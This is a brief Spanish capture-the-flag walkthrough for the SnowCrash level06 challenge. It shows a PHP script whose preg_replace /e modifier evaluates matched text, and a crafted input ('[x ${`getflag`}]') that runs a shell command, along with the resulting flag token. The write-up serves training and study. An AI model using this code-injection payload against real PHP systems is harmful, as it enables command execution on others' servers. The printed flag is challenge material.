# PHP Injection

al hacer `ls` encontramos un ejecutable level06 y un archivo .php que al abrirlo sael esto:
```
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

El cual lo que hace es busca patron [x..] y como tiene el /e intenta ejecutar el patron quje ha encontrado y si hay hace unios reemplazos y ya luego lo imprime.

${} en PHP permite evaluar expresiones dentro de una cadena cuando se usa en preg_replace('/e'), forzando su ejecución en lugar de tratarlo como texto.

Por lo tanto si hacemos:
```
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/getflag.txt
level06@SnowCrash:~$ ./level06 /tmp/getflag.txt
```

Ejecuta el codigo y nos da la flag:
´´´
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
´´´